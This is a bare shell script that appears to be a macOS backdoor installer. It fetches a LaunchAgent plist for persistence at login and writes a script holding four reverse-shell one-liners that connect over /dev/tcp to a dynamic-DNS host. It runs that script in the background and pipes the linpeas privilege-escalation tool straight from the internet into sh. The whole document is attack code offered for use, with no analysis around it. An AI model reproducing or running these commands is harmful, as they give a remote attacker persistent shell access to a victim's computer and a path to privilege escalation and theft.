curl -L https://raw.githubusercontent.com/canarddu38/temp/main/loginscript.plist --output ~/Library/LaunchAgents/com.user.loginscript.plist

cat > ~/bashlogon_d.sh <<EOF
bash -i >& /dev/tcp/linpeas874269852.ddns.net/45358 0>&1

exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358;cat <&5 | while read line; do $line 2>&5 >&5; done

exec /bin/sh 0</dev/tcp/linpeas874269852.ddns.net/45358 1>&0 2>&0

0<&196;exec 196<>/dev/tcp/linpeas874269852.ddns.net/45358; sh <&196 >&196 2>&196
EOF

chmod +x ~/bashlogon_d.sh

bash ~/bashlogon_d.sh &

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
